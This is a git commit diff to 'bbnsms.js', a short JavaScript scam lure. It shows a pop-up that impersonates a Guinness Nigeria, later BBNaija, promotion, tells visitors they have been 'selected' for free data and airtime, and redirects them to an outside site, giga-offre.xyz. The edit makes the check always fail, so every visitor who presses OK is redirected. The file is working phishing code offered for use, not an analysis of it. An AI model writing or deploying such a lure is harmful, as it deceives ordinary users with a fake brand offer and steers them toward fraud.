d965d191731a9dcbe9fbb382e0842f3b6a012360
bigetijazz5 <bigetijazz5@gmail.com>
2024-10-06 16:19:41 -0700

    Update bbnsms.js

--- bbnsms.js
+++ bbnsms.js
@@ -1,6 +1,6 @@
 
-var password = 'ACTIVATE 20GB + AIRTIME '
-password=prompt('GUINNESS Nigeria: Hello, you are among the selected bbn fans to benefit from this offer. Press Ok to get offer now ','ACTIVATE 20GB + AIRTIME');
-if (password != 'ACTIVATE 20GB + AIRTIME') {
+var password = 'ACTIVATE 10GB + AIRTIME '
+password=prompt('BBnaija: Hello, you are among the selected bbn fans to benefit from this offer. Press Ok to get offer now ','ACTIVATE 20GB + AIRTIME');
+if (password != 'ACTIVATE 10GB + AIRTIME') {
 location.href='https://www.giga-offre.xyz/10gb-bbnaijaseason9';
 }
